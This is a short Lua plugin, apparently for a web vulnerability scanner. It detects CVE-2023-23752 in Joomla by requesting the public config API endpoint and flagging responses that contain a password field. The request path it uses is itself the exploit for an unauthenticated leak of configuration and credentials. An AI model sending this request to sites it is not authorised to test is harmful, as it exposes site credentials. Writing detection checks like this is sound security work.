-- AUTHOR: Mohamed Tarek @0xr00t3d
-- Reference: https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html

SCAN_TYPE = 2
BODY_MATCH = { "{\"links\":", "password", "attributes" }

function send_report(resp)
    Reports:add {
        name = "CVE-2023-23752",
        url = resp.url,
        risk = "High",
        description = "An improper access check allows unauthorized access to webservice endpoints.",
    }
end

function scan_cve(path)
    local new_url = HttpMessage:urljoin(path)

    local status, resp = pcall(function()
        return http:send { url = new_url }
    end)

    if status ~= true then
        return
    end


    local body = resp.body

    if resp.status == 200 then
        if Matcher:match_body_once(body, BODY_MATCH) then
            send_report(resp)
        end
    end
end

function main()
    scan_cve("api/index.php/v1/config/application?public=true")
end
